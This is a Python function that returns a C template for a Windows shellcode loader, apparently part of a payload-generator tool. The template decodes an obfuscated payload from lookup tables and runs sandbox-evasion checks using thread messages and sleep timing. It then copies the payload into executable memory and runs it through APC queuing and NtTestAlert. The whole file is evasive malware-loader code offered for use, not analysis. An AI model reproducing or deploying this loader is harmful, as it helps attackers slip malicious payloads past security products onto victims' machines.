###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/apc-and-nttestalert-code-execute"
def get():
    c_code = '''
#include <windows.h>
#include <stdio.h>

typedef VOID(NTAPI* pNtTestAlert)(VOID);
<TABLES>
int main() {


    MSG msg;
    DWORD tc;
    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                return 0;

    if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
    return 0;
    tc = GetTickCount();
    Sleep(650);

    if (((GetTickCount() - tc) / 300) != 2)
        return 0;
                
	PCHAR lpBuffer = <ALLOC>
	for (int i = 0; i < sizeof(offset_table)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = random_dict_table[offset_table[i]];
	}
	
	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
	LPVOID lpBaseAddress = VirtualAlloc(NULL, sizeof(lpBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(lpBaseAddress, lpBuffer, sizeof(offset_table));
	QueueUserAPC((PAPCFUNC)lpBaseAddress, GetCurrentThread(), NULL);
	
	NtTestAlert();
	return 0;
}
    '''
    return c_code

